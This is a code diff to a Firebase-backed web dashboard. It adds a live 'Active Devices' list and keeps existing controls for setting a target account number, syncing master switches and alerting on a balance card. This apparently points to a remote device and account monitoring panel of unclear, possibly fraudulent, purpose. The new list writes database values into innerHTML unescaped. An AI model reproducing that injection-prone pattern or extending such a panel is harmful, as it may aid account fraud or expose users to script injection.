@@ -31,6 +31,11 @@
         /* Notification Pulse */
         .alert-pulse { animation: pulse-red 1s infinite; border-color: var(--danger) !important; }
         @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(218, 54, 51, 0); } 100% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0); } }
+
+        /* Device List Styling to match original theme */
+        .device-container { margin-top: 10px; max-height: 200px; overflow-y: auto; }
+        .device-row { background: #0d1117; border: 1px solid var(--border); padding: 10px; border-radius: 6px; margin-bottom: 5px; font-size: 13px; display: flex; justify-content: space-between; }
+        .device-id { color: var(--primary); font-family: monospace; }
     </style>
 </head>
 <body>
@@ -47,6 +52,14 @@
         <div class="label">Last Activity</div>
         <div id="last-time" style="font-size: 13px;">No data yet</div>
         <audio id="alert-sound" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
+    </div>
+
+    <div class="card">
+        <h3 style="margin-top:0">Active Devices (activate)</h3>
+        <div class="label">Total Devices: <span id="device-count">0</span></div>
+        <div id="activate-list" class="device-container">
+            <div style="text-align:center; padding: 20px; color: #8b949e;">Scanning for devices...</div>
+        </div>
     </div>
 
     <div class="card">
@@ -106,7 +119,32 @@
         }
     });
 
-    // 2. Sync Master Switches
+    // 2. Monitor Activate Table (Devices)
+    db.ref('activate').on('value', (snap) => {
+        const listDiv = document.getElementById('activate-list');
+        const countSpan = document.getElementById('device-count');
+        listDiv.innerHTML = "";
+        
+        if(snap.exists()) {
+            const data = snap.val();
+            let count = 0;
+            for(let key in data) {
+                count++;
+                const item = document.createElement('div');
+                item.className = 'device-row';
+                // If data[key] is an object, show one of its properties, else show the value
+                const info = typeof data[key] === 'object' ? (data[key].model || "Online") : data[key];
+                item.innerHTML = `<span>Device: <span class="device-id">${key}</span></span> <span>${info}</span>`;
+                listDiv.appendChild(item);
+            }
+            countSpan.innerText = count;
+        } else {
+            listDiv.innerHTML = '<div style="text-align:center; padding: 20px; color: #8b949e;">No devices active</div>';
+            countSpan.innerText = "0";
+        }
+    });
+
+    // 3. Sync Master Switches
     db.ref('control').on('value', (snap) => {
         const data = snap.val();
         if(data) {
@@ -115,7 +153,7 @@
         }
     });
 
-    // 3. Actions
+    // 4. Actions
     function setTarget() {
         const acc = document.getElementById('account-input').value;
         if(!acc) return alert("Enter account number first!");
@@ -137,7 +175,7 @@
         const card = document.getElementById('balance-card');
         const sound = document.getElementById('alert-sound');
         card.classList.add('alert-pulse');
-        sound.play();
+        if(sound) sound.play();
         setTimeout(() => card.classList.remove('alert-pulse'), 5000);
     }
 </script>
